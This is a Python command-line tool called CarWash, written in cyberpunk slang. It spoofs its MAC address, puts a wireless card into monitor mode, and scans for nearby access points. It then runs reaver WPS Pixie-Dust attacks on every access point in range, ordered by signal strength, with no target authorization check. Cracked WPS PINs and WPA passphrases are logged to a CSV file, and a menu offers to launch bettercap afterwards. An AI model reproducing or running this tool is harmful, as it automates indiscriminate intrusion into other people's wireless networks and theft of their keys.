import click
import subprocess
import csv
import time
import sys
import os
import socket


def print_carwash_ascii():
    carwash_ascii = '''











                                      ((( /\ )))
                                          ||
    [r0ll1n 1n my (arm) six-f0']          ||
                         _________________||__
                        [|||||||||||||||||||||]
                    ___/~~~~~~~~~~~~~~~~~~~~~~~\___
                   /                               \             
                 _/       [CarWash]::[1.0.5]        \_           
             {_}/_____                           _____\{_}       
            .-''      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-.       
          .-~            ____________________            ~-.
         '~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~'
         | | | #### #### || | | | [] | | | || #### #### | | |
         ;__\|___________|++++++++++++++++++|___________|/__;
          (~~====___________________________________====~~~)
           \------____________[_Hosaka_]___________-------/
              |      ||                        ||      |
               \_____/   [d3k@t3ss3r4]:[2024]   \_____/  
                '''
    print(carwash_ascii)

def is_interface_in_monitor_mode(interface):
    iwconfig_cmd = ["iwconfig", interface]
    result = subprocess.run(iwconfig_cmd, capture_output=True, text=True)
    return "Mode:Monitor" in result.stdout

def get_available_interfaces():
    hostname = socket.gethostname()
    # Get the available wireless interfaces using iwconfig
    time.sleep(.5)
    click.echo(f"\n[+]:[↓]:[{hostname}'s available interface links:]:[↓]\n")
    iwconfig_cmd = ["iwconfig"]
    result = subprocess.run(iwconfig_cmd, capture_output=True, text=True)
    output_lines = result.stdout.splitlines()
    interfaces = [line.split(" ")[0] for line in output_lines if "IEEE" in line]
    return interfaces

def set_monitor_mode(interface):
    needs_monitor_mode = False
    # Set the interface to monitor mode using airmon-ng
    print("\n[x]:[Systemctl]:[Stopping dhcpcd.service.]", flush=True)
    subprocess.run(["sudo", "systemctl", "stop", "dhcpcd.service"])
    time.sleep(2)
    print("\n[x]:[rfkill]:[Removing blockages.]", flush=True)
    time.sleep(1)
    subprocess.run(["sudo", "rfkill", "unblock", "all"])
    print("\n[x]:[Airmon-ng]:[Check-killing interference on the system.]", flush=True)
    time.sleep(1)
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.PIPE, text=True)
    time.sleep(1)
    print(f"\n[x]:[Airmon-ng]:[Initiating monitor mode on {interface}.]", flush=True)
    subprocess.run(["sudo", "airmon-ng", "start", interface,], stdout=subprocess.PIPE, text=True)
    interface = f"{interface}mon"
    time.sleep(1)
    print(f"\n[x]:[macchanger]:[Spoofing MAC address for {interface}.]\n", flush=True)
    subprocess.run(["sudo", "ifconfig", interface, "down"])
    time.sleep(.5)
    subprocess.run(["sudo", "macchanger", "-r", interface,])
    time.sleep(.5)
    subprocess.run(["sudo", "ifconfig", interface, "up"])

    needs_monitor_mode = True

    return needs_monitor_mode

def run_wash(interface):
    # Run wash for 14 seconds and capture the output in a CSV file
    wash_cmd = ["wash", "-i", interface, "-F"]
    with open("traffic_report.csv", "w") as wash_csv_file:
        wash_process = subprocess.Popen(wash_cmd, stdout=wash_csv_file, universal_newlines=True)

        # Wait for 14 seconds or until wash finishes
        try:
            wash_process.communicate(timeout=14)
        except subprocess.TimeoutExpired:
            wash_process.terminate()
            wash_process.communicate()


def log_ap_list(existing_data):
    ap_list = []

    # Read data from the wash output CSV file
    with open("traffic_report.csv", "r") as csvfile:
        reader = csv.DictReader(csvfile, delimiter=" ", skipinitialspace=True)
        next(reader)  # Skip the header row
        for row in reader:
            bssid = row["BSSID"]
            channel = int(row["Ch"])
            signal_strength = int(row["dBm"])
            essid = row["ESSID"]
            if not essid:
                click.echo(f"\n[-]:[Skipping Target AP with cloaked ESSID]")
                click.echo(f"[=]:[{essid}]:[{bssid}]:[{channel}]:[{signal_strength} dBm]\n")
                time.sleep(0.3)
                continue
            ap_list.append({"essid": essid, "bssid": bssid, "channel": channel, "signal_strength": signal_strength})

    ap_list.sort(key=lambda x: x["signal_strength"], reverse=True)
    return ap_list


def run_reaver(interface, ap_bssid, channel, suppress_header=True):
    cmd = ["reaver", "-i", interface, "-b", ap_bssid, "-c", str(channel), "-F", "-N", "-K", "-vv"]

    wps_pin = None
    wpa_psk = None

    with subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True, bufsize=1) as process:
        try:
            stdout, _ = process.communicate(timeout=28)
            for line in stdout.splitlines():
                # Process the output and print relevant information
                click.echo(line.strip())
                time.sleep(0.1)
                if "WPS PIN:" in line:
                    wps_pin = line.strip().split(":")[-1].strip()
                elif "WPA PSK:" in line:
                    wpa_psk = line.strip().split(":")[-1].strip()
        except subprocess.TimeoutExpired:
            process.terminate()
            stdout, _ = process.communicate()
            for line in stdout.splitlines():
                # Process the output and print relevant information
                click.echo(line.strip())
                time.sleep(0.1)
            click.echo("\n[-]:[Target lock failure.]")
            time.sleep(0.5)
            click.echo("[>]:[Acquiring next target.]")
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            click.echo("\n[-][Target lock terminated by operator.]")
            time.sleep(0.5)
            click.echo("[>]:[Acquiring next target.]")


    time.sleep(1)
    return wps_pin, wpa_psk

def read_existing_data():
    try:
        with open("traffic_ticket.csv", "r") as csvfile:
            reader = csv.DictReader(csvfile)
            existing_data = [row for row in reader]
            return existing_data
    except FileNotFoundError:
        return []
    
def is_duplicate_ap(ap_info, existing_data):
    for existing_ap in existing_data:
        if all(ap_info[field] == existing_ap[field] for field in ap_info.keys()):
            return True
    return False

def save_to_file(ap_info):
    fieldnames = ["BSSID", "ESSID", "WPS PIN", "WPA PSK"]
    existing_data = read_existing_data()

    with open("traffic_ticket.csv", "a", newline="") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        # Write the header if the file is empty
        if not existing_data:
            writer.writeheader()

        # Write only the new access points to the file if they have been successfully pwned
        for ap in ap_info:
            if ap["WPS PIN"] or ap["WPA PSK"]:  # Check if either WPS PIN or WPA PSK is present
                # Check for duplicates before adding the results
                if not is_duplicate_ap(ap, existing_data):
                    writer.writerow(ap)



def print_traffic_ticket():
    try:
        with open("traffic_ticket.csv", "r") as csvfile:
            reader = csv.DictReader(csvfile)
            ap_info = list(reader)
            valid_entries = [ap for ap in ap_info if ap["WPA PSK"]]
            if valid_entries:
                click.echo("\n[+]:[↓]:[Traffic Tickets]:[↓]")
                click.echo()
                # Adjust the column widths here (e.g., change 20 to a lower value)
                click.echo("{:<4} {:<20} {:<25} {:<14} {:<18}".format("No.", "BSSID", "ESSID", "WPS PIN", "WPA PSK"))

                for i, ap in enumerate(valid_entries, 1):
                    bssid = ap["BSSID"]
                    essid = ap["ESSID"]
                    wps_pin = ap["WPS PIN"]
                    wpa_psk = ap["WPA PSK"]

                    # Adjust the column widths here (e.g., change 18, 30, 12, and 16 to lower values)
                    click.echo("{:<4} {:<20} {:<25} {:<14} {:<18}".format(i, bssid, essid, wps_pin, wpa_psk))
                    time.sleep(0.1)  # Add a small delay between each row to remove double spacing
            else:
                click.echo("[-]:[Bad run chooms: All work and no pay!]")
    except FileNotFoundError:
        click.echo("[-]:[You got no record.. 'runners musta ghosted you...]")

def reset_network_configuration(interface):
    hostname = socket.gethostname()
    if not click.confirm('\n[?]:[Reset monitor link iface & network config?]', default=True):
        click.echo("\n[-]:[CarWash network config intact and monitor iface up]\n")
        return
    
    click.echo(f"\n[+]:[Resetting monitor link {interface} & network config.]\n")
    time.sleep(1)
    subprocess.run(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.PIPE, text=True)
    time.sleep(2)
    click.echo(f"[x]:[airmon-ng]:[Monitor iface {interface} down.]")
    print("\n[x]:[Systemctl]:[Restarting dhcpcd.service.]", flush=True)
    time.sleep(1)
    subprocess.run(["sudo", "systemctl", "restart", "dhcpcd.service"])
    time.sleep(2)
    print("\n[x]:[Systemctl]:[dhcpcd.service active.]", flush=True)
    print("\n[x]:[Systemctl]:[restarting networking.service.]", flush=True)
    time.sleep(1)
    subprocess.run(["sudo", "systemctl", "restart", "networking.service"])
    time.sleep(1)
    print("\n[x]:[Systemctl]:[networking.service active.]", flush=True)
    print("\n[x]:[Systemctl]:[Restarting NetworkManager.]", flush=True)
    time.sleep(1)
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
    time.sleep(1)
    print("\n[x]:[Systemctl]:[NetworkManager active.]", flush=True)
    subprocess.run(["sudo", "systemctl", "restart", "dhcpcd.service"])
    click.echo(f"\n[+]:[{hostname} cyberdeck is ready to run, chooms.]\n")
    time.sleep(1)
    open_tool()
    

def open_tool():
    hostname = socket.gethostname()
    if not click.confirm("\n[?]:[Deploy a new tool to keep runnin'?]\n", default=True):
        click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
        time.sleep(.5)
        click.echo("\n[+]:[Hack the Planet, chooms.]")
        return
    
    while True:
        time.sleep(.5)
        reply = click.prompt("\n[?]:[↓]:[Choose your weapon wisely:]:[↓]\n\n[1]:[bettercap]\n[2]:[toolname]\n[3]:[toolname]\n[4]:[toolname]\n[5]:[toolname]\n[6]:[toolname]\n[7]:[...]\n[8]:[...]\n[9]:[...]\n[10]:[...]\n\n[x]:[Exit]\n").lower()
        click.echo()

        if reply == "1":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying bettercap...]")
            subprocess.Popen(["bettercap"])
            break
        elif reply == "2":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "3":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "4":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "5":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "6":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "7":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "8":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "9":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "10":
            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
            subprocess.Popen(["command+path"])
            break
        elif reply == "x":
            click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
            time.sleep(.5)
            click.echo("\n[+]:[Hack the Planet, chooms.]")
            break

    
def restart_prompt(interface):
    while True:
        if not click.confirm('\n[?]:[rollCar and reWash?]\n', default=True):
            click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
            reset_network_configuration(interface)
            time.sleep(.5)
            click.echo("\n[+]:[Hack the Planet, chooms.]")
            return

        click.echo("\n[+]:[Resetting CarWash...]\n")
        time.sleep(1)
        try:
            carwash()  # Pass only the prompt argument
        except KeyboardInterrupt:
            reset_network_configuration(interface)
            open_tool()
            click.echo("\n[+]:[Hack the Planet, chooms.]")
            sys.exit(1)

@click.command()
@click.option('-i', '--interface', type=str, metavar='INTERFACE', help='Monitor / Injection link for CarWashing.')
@click.option('--tickets', '-t', is_flag=True, help='Print traffic tickets without configuring networking for a run.')

def carwash(interface, tickets):
    print_tickets = tickets
    existing_data = read_existing_data()  # Get existing data at the beginning of the carwash function

    # Show the ASCII art of carwash
    print_carwash_ascii()

     # If --print-tickets flag is provided, print traffic tickets and exit
    if print_tickets:
        print_traffic_ticket()
        open_tool()
        sys.exit(0)
        

    # Ask for confirmation before starting the wash process
    if not click.confirm('\n[?]:[Ready to roll these mean streets console cowboy?]', default=True):
        click.echo("\n[-]:[You fell over the edge punk!]\n")
        click.echo("\n[+]:[Hack the Planet!]")
        return

    # Get available interfaces if interface is not provided
    if not interface:
        click.echo("\n[?]:[You didn't chip' your monitor link you g0nk!]\n")
        available_interfaces = get_available_interfaces()
        for i, iface in enumerate(available_interfaces, 1):
            click.echo(f"{i}. {iface}")
            time.sleep(1)

        while True:
            try:
                choice = int(click.prompt("\n[?]:[What link you wanna' chip?]"))
                if 1 <= choice <= len(available_interfaces):
                    interface = available_interfaces[choice - 1]
                    time.sleep(1)
                    break
                else:
                    click.echo("[!]:[Invalid choice]:[>]:[Try again.]")
            except ValueError:
                click.echo("[!]:[Invalid input]:[>]:[Try again.]")

        # Put the interface into monitor mode if needed
        if "mon" not in interface:
            needs_monitor_mode = set_monitor_mode(interface)
            if needs_monitor_mode:
                interface = f"{interface}mon"

        click.echo(f"\n[+]:[Monitor link {interface} is up with MAC spoofed.]")
    

    # Run wash for 14 seconds and save the output
    click.echo("\n[+]:[Washing and scanning the 'waves around your ride...]")
    time.sleep(1)
    run_wash(interface)
    click.echo()
    

    # Log the AP list
    ap_list = log_ap_list(existing_data)

    click.echo("\n[+]:[↓]:[Washable Traffic:]:[↓]")
    time.sleep(1)    
    click.echo("{:<4} {:<18} {:<30} {:<8} {:<16}".format("No.", "BSSID", "ESSID", "Chan", "dBm"))

    for i, ap in enumerate(ap_list, 1):
        # Handling None values in the output
        bssid = ap["bssid"] or "N/A"
        essid = ap["essid"] or "N/A"
        channel = ap["channel"] or "N/A"
        signal_strength = ap["signal_strength"] or "N/A"
        
        click.echo("{:<4} {:<18} {:<30} {:<8} {:<16}".format(i, bssid, essid, channel, signal_strength))
    time.sleep(2)


     # Start attacking APs with Reaver and save results
    results = []
    try:
        for ap in ap_list:
            essid = ap["essid"]
            bssid = ap["bssid"]
            signal_strength = ap["signal_strength"]
            channel = ap["channel"]

            print(f"\n[+]:[CarWash target acquired and locked:] \n[=]:[{essid}]:[{bssid}]:[{channel}]:[{signal_strength} dBm]\n")

            # Run Reaver attack for the current AP
            wps_pin, wpa_psk = run_reaver(interface, bssid, channel)

            if wps_pin and wpa_psk:
                time.sleep(0.5)
                click.echo(f"\n[x]:[↓]:[Access Point Pwned!]:[↓]\n")
                time.sleep(0.2)                
                click.echo(f"[=]:[{essid}]:[{bssid}]:[{wps_pin}]:[{wpa_psk}]")
            
            # Check for duplicates before adding the results
            ap_info = {
                "ESSID": essid,
                "BSSID": bssid,
                "WPS PIN": wps_pin,
                "WPA PSK": wpa_psk,
            }
            if not is_duplicate_ap(ap_info, existing_data):
                results.append(ap_info)
            else:
                click.echo(f"[x]:[Previously logged.]:[>]:[Skipping duplicate ticket.]\n")

    except KeyboardInterrupt:
            click.echo("\n[x]:[Terminating CarWash session and generating Traffic Tickets]")

    finally:
        save_to_file(results)
        print_traffic_ticket()

        # After finishing the current session, prompt for restart
        restart_prompt(interface)
        sys.exit(0)

if __name__ == "__main__":
    carwash()

